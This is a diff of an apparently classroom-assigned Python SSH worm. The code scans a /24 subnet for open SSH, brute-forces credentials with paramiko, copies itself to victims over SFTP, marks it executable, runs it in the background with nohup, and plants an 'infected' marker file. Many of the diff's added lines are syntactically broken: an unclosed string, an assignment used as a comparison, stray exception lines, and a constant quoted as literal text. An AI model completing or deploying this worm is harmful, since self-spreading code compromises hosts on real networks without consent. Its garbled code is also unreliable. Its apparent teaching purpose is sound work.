@@ -31,7 +31,8 @@ def isInfectedSystem():
 	# as infected).
 	##
 	# checks if infected.txt already exists
-	os.path.isfile("/infected.txt")
+	os.path.isfile(INFECTED_MARKER_FILE)
+		
 	
 #################################################################
 # Marks the system as infected
@@ -45,7 +46,7 @@ def markInfected():
 	# Creates a file named infected.txt to mark the system as infected
 	# Open the file and write something to it. This is evidence that the worm
 	# has executed on the remote system.
-	file = open("tmp/infected.txt", "w")
+	file = open(INFECTED_MARKER_FILE, "w")
 	
 	# write something to the file
 	file.write("You just been INFECTED!")
@@ -66,13 +67,14 @@ def spreadAndExecute(sshClient):
 	# This function takes as a parameter 
 	# an instance of the SSH class which
 	# was properly initialized and connected
-	# to the victim system. The worm will
-	# copy itself to remote system, change
+	# to the victim system. 
+	# The worm will copy itself to remote system, change
 	# its permissions to executable, and
 	# execute itself. Please check out the
 	# code we used for an in-class exercise.
 	# The code which goes into this function
 	# is very similar to that code.	
+	
 	
 	
 
@@ -88,7 +90,7 @@ def spreadAndExecute(sshClient):
 ###########################################################
 def tryCredentials(host, userName, password, sshClient):
 	
-	# Tries to connect to host host using
+	# Tries to connect to host using
 	# the username stored in variable userName
 	# and password stored in variable password
 	# and instance of SSH class sshClient.
@@ -121,21 +123,22 @@ def tryCredentials(host, userName, password, sshClient):
 			ssh.connect("192.168.1.24" , username="credList", password="credList"
 	except
 		print "something went wrong while trying to establish a connection"
+		paramiko.SSHException exception
 	
 	# create an instance of the SFTP client used for uploading/dl files and exe. commands
 	sftpClient = ssh.open_sftp()
 	
 	# Copy yourself toe the remote system. 
-	sftpClient.put("infected.txt", "/tmp/infected.txt")
+	sftpClient.put("infected.txt", INFECTED_MARKER_FILE)
 	
 	# Make yourself executable on the remote system
-	ssh.exec_command("chmod a+x /tmp/infect.txt")
+	ssh.exec_command("chmod a+x INFECTED_MARKER_FILE)
 		
 
 	# /tmp/infected.txt - the malicious file
 	
 	# run the whole commnand in the background	
-	ssh.exec_command("nohup python /tmp.infected.txt &")
+	ssh.exec_command("nohup python INFECTED_MARKER_FILE &")
 	
 
 ###############################################################
@@ -173,9 +176,12 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		pass	
+		tryCredentials(getHostsOnTheSameNetwork, username, password)
+		if tryCredentials = 0 
+			print ("we have successfully compromised the victim")
 			
 	# Could not find working credentials
+	paramiko.SSHException exception
 	
 	print("could not find working credentials")
 	#return None	
@@ -219,7 +225,7 @@ def getHostsOnTheSameNetwork():
 	# SSH running there). 
 	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
 		
-	# Scan the network for hoss
+	# Scan the network for host
 	hostInfo = portScanner.all_hosts()	
 	
 	return hostInfo
@@ -277,9 +283,9 @@ for host in networkHosts:
 		# when it first infects the system)
 		# This can be done using code similar to
 		# the code below:
-		# try:
-        	#	 remotepath = '/tmp/infected.txt'
-		#        localpath = '/home/cpsc/'
+		 try:
+			remotepath = '/tmp/infected.txt'
+		    localpath = '/home/cpsc/'
 		#	 # Copy the file from the specified
 		#	 # remote path to the specified
 		# 	 # local path. If the file does exist
@@ -288,9 +294,9 @@ for host in networkHosts:
 		# 	 # (that is, we know the system is
 		# 	 # not yet infected).
 		# 
-		#        sftp.get(filepath, localpath)
-		# except IOError:
-		#       print "This system should be infected"
+		        sftp.get(filepath, localpath)
+		 except IOError:
+		       print "This system should be infected"
 		#
 		#
 		# If the system was already infected proceed.
